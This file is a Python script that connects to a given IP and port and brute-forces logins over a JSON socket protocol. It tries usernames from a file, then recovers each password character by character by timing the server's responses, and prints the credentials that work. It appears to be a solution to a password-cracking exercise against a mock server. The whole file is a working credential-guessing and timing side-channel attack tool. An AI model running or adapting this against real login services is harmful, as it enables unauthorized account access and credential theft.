import argparse
import json
import socket
import string
import time


def get_file():
    with open('logins.txt', 'r') as pw:
        logins = pw.read().split('\n')
    return logins


def find_password():
    const = string.ascii_letters + string.digits
    for i in const:
        yield i


def get_password(client, login):
    password = ''
    while True:
        for letter in find_password():
            request = {"login": login, "password": password + letter}
            request_json = json.dumps(request, indent=4)
            client.send(request_json.encode())
            start_time = time.perf_counter()
            response = json.loads(client.recv(1024).decode())
            end_time = time.perf_counter()
            delay = end_time - start_time
            if 0.09 < round(delay, 2) <= 0.11:
                password += letter
                break
            if response["result"] == 'Connection success!':
                print(request_json)
                exit()


def get_login(client):
    for login in get_file():
        request = {
            "login": login,
            "password": ' '
        }
        request_json = json.dumps(request)
        client.send(request_json.encode())
        response = json.loads(client.recv(1024).decode())
        if response["result"] != "Wrong login!":
            get_password(client, login)


def connect(host, port):
    with socket.socket() as client:
        client.connect((host, port))
        get_login(client)


def get_address():
    parser = argparse.ArgumentParser()

    parser.add_argument("ip", type=str)
    parser.add_argument("port", type=int)

    args = parser.parse_args()
    connect(args.ip, args.port)


if __name__ == '__main__':
    get_address()
